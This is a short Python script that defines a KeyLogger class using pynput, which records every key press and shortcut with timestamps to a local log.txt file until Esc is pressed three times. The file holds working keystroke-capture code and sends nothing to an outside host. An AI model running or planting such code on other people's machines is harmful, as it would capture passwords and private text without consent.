from pynput.keyboard import Key, Listener
from datetime import datetime

class KeyLogger:
    def __init__(self, log_file="log.txt"):
        self.esc_count = 0
        self.keys_pressed = set()
        self.log_file = log_file
        self.modifier_keys = {Key.ctrl, Key.ctrl_l, Key.ctrl_r, Key.shift, Key.shift_l, Key.shift_r, Key.alt, Key.alt_l, Key.alt_r}
        self.recognized_shortcuts = {
            ('Ctrl', 'a'): 'Ctrl+A',
            ('Ctrl', 'c'): 'Ctrl+C',
            ('Ctrl', 'v'): 'Ctrl+V',
            # Add more shortcuts as needed
        }
    
    def log_to_file(self, message):
        try:
            with open(self.log_file, "a", encoding='utf-8') as log_file:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_file.write(f"{timestamp} - {message}\n")
        except Exception as e:
            print(f"Error writing to log file: {e}")

    def format_keys(self):
        formatted_keys = []
        if any(key in self.keys_pressed for key in self.modifier_keys):
            if Key.ctrl in self.keys_pressed or Key.ctrl_l in self.keys_pressed or Key.ctrl_r in self.keys_pressed:
                formatted_keys.append("Ctrl")
            if Key.shift in self.keys_pressed or Key.shift_l in self.keys_pressed or Key.shift_r in self.keys_pressed:
                formatted_keys.append("Shift")
            if Key.alt in self.keys_pressed or Key.alt_l in self.keys_pressed or Key.alt_r in self.keys_pressed:
                formatted_keys.append("Alt")
        
        for key in self.keys_pressed:
            if key not in self.modifier_keys:
                if hasattr(key, 'char') and key.char is not None:
                    formatted_keys.append(key.char)
                else:
                    key_name = str(key).replace('Key.', '')
                    formatted_keys.append(key_name)
        
        return tuple(formatted_keys)

    def log_shortcut(self):
        key_tuple = self.format_keys()
        shortcut = self.recognized_shortcuts.get(key_tuple)
        if shortcut:
            self.log_to_file(f"Shortcut used: {shortcut}")
        else:
            self.log_to_file(f"Key pressed: {'+'.join(key_tuple)}")
    
    def on_press(self, key):
        self.keys_pressed.add(key)
        self.log_shortcut()
    
    def on_release(self, key):
        if key == Key.esc:
            self.esc_count += 1
            if self.esc_count == 3:
                self.log_to_file("Esc key pressed three times. Exiting...")
                return False
        if key in self.keys_pressed:
            self.keys_pressed.remove(key)
    
    def start_logging(self):
        self.log_to_file("Logging started")
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start_logging()
